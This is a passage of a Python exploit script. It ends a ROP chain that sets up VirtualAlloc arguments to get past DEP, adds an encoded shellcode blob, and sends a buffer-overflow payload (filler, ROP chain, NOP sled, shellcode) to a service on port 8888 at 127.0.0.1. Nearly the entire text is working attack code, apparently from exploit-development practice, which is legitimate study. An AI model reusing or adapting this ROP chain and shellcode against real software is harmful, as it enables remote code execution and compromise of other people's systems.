                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                ## PUT -0x00000001 in EAX
                0x61b6122a,  # pop eax; ret;
                0xffffffff,  # -0x00000001
                ## NEG EAX, to become 1
                0x699ef43a,  # neg eax; ret;
                ## Write on 0x48484848 (ECX)
                0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

                ##############
                # -> flAllocationType (0x49494949)
                ##############
                ## Increase 4 bytes in ECX
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                ## PUT -0x1001 in EAX
                0x61b6122a,  # pop eax; ret;
                0xffffefff,  # -0x1001
                ## NEG EAX, to become 1001
                0x699ef43a,  # neg eax; ret;
                ## DEC EAX, to become 1000
                0x68a84305,  # dec eax; ret;
                ## Write on 0x49494949 (ECX)
                0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

                ##############
                # -> flProtect (0x51515151)
                ##############
                ## Increase 4 bytes in ECX
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                ## PUT -0x40 in EAX
                0x61b6122a,  # pop eax; ret;
                0xffffffc0,  # -0x40
                ## NEG EAX, to become 40
                0x699ef43a,  # neg eax; ret;
                ## Write on 0x51515151 (ECX)
                0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

                ##############
                # -> ECX to ESP
                ##############
                ## PUT -20 on EBP
                0x6aa812c9,  # pop ebp; ret;
                0xffffffec,  # -20
                ## DEC ECX in 20
                0x6d9c8e42,  # add ecx, ebp; ret;
                ## PUT ECX, on ESP
                0x6eb53647,  # mov esp, ecx; ret;

                ]
        return ''.join(pack('<L', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

virtual_alloc_placeholder = pack("<L", (0x45454545)) # KERNEL32!VirtuaAllocStub
virtual_alloc_placeholder += pack("<L", (0x46464646)) # Shellcode Retrun Addres
virtual_alloc_placeholder += pack("<L", (0x47474747)) # Shellcode Address
virtual_alloc_placeholder += pack("<L", (0x48484848)) # dwSize
virtual_alloc_placeholder += pack("<L", (0x49494949)) # flAllocationType
virtual_alloc_placeholder += pack("<L", (0x51515151)) # flProtect

shellcode =  b""
shellcode += b"\xda\xdd\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x5e"
shellcode += b"\xbf\x85\xf0\x6d\xbf\x83\xed\xfc\x31\x7d\x15"
shellcode += b"\x03\x7d\x15\x67\x05\xe4\x5a\xe6\x22\x07\x5d"
shellcode += b"\x17\x55\xd9\x57\x83\x21\x6b\x58\xc0\x40\x80"
shellcode += b"\x13\xa0\xb0\x13\x7d\x44\x42\x5d\xa2\xdf\x62"
shellcode += b"\xc4\x9b\x90\x92\x7d\x2e\xc5\xa5\x23\x47\x6c"
shellcode += b"\xae\x30\x03\x66\x5b\x39\x53\x89\xc4\x4d\xef"
shellcode += b"\x49\x8e\x2e\xf3\xc9\x91\x11\x78\x66\x8a\x26"
shellcode += b"\x38\x58\xab\xe0\x4e\xdd\x57\xf3\x67\x94\x2c"
shellcode += b"\xb1\x7b\xad\x07\xb2\x85\x6f\x56\x02\x1c\x73"
shellcode += b"\x35\x06\xdf\xff\x41\xc6\x2a\xf2\x4c\x0a\x41"
shellcode += b"\xf8\x74\xde\xb2\x24\xfe\x01\x31\x73\x24\xbf"
shellcode += b"\x9c\x1d\xaf\xb3\x6a\x6a\xf8\xd7\x6b\xb6\x8c"
shellcode += b"\xec\xe1\x47\x4b\x65\xb1\x63\x77\x17\xf9\x03"
shellcode += b"\x04\x6e\x48\xab\xf5\xc4\xb7\xc2\x4f\xf7\xdf"
shellcode += b"\x5a\x01\xf9\xf3\x9d\xcb\x01\x85\x24\xe0\x61"
shellcode += b"\xe7\x58\xbb\x64\xf8\xf1\xb8\x01\x43\xe1\xf1"
shellcode += b"\xd1\x2a\xa9\x9e\xbd\xe2\xa1\x6d\x0c\x2d\x55"
shellcode += b"\xfa\x07\x42\xa7\xa5\xb3\x5b\x92\x4d\xb5\x67"
shellcode += b"\x74\xa5\x28\x9b\xbf\xc6\xe6\x60\x36\x7d\x15"
shellcode += b"\x01\x91\x77\xd0\x7c\xde\xdd\x1e\xf6\x65\xfe"
shellcode += b"\x76\x04\xdf\xd3\x35\xeb\x4a\x28\xb3\x51\x50"
shellcode += b"\xb9\x23\x68\x51\xdf\x1a\x1b\x64\x09\x95\x4c"
shellcode += b"\x57\x89\x43\xd5\x95\x0b\xdc\xda\xcc\x17\xed"
shellcode += b"\xe4\xbe\x77\x5d\x55\x38\x28\x71\x90\x14\x88"
shellcode += b"\xd9\x65\xc1\x28\x53\x5f\xd8\xe8\x33\x30\x72"
shellcode += b"\x29\x1b\xca\x4e\xcf\xe4\x2a\xf5\xd1\xf5\x3d"
shellcode += b"\x6f\x51\x35\x3f\x3f\x01\xe9\x71\x7f\xf9\x45"
shellcode += b"\x22\x2f\xfe\x75\x92\x98\xa8\x8a\x47\x02\x03"
shellcode += b"\x23\x3e\x7b\x6b\x9b\xee\xcb\xeb\x2d\xc6\x9a"
shellcode += b"\x6c\x4c\x10\x8c\x5d\x8f\xf0\x7c\xce\x5f\xa1"
shellcode += b"\x2c\xbe\x0f\x11\x9c\x8e\xf4\xc1\x48\xb0\x4c"
shellcode += b"\x7a\xf7\xd4\x52\x8a\x2f\xb8\xc4\x16\xa2\x5d"
shellcode += b"\x3b\x8d\x67\x17\xa3\x1c\x5e\x41\x9d\xcf\x63"
shellcode += b"\xa7\x15\xbf\x34\x86\x65\x10\xea\xb8\x25\xc1"
shellcode += b"\x42\x69\xf6\xb2\x02\x76\xa3\x2c\x93\x41\x1d"
shellcode += b"\x27\x2c\xae\xcb\xa7"


payload = b'\x41' * (1052 - len(virtual_alloc_placeholder))
payload += virtual_alloc_placeholder
payload += pack("<L", (0x6ab2223e))  # ret
payload += rop_chain
payload += b'\x90' * 600
payload += shellcode
	
target = b'127.0.0.1'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except:
	print "Crashed!"
```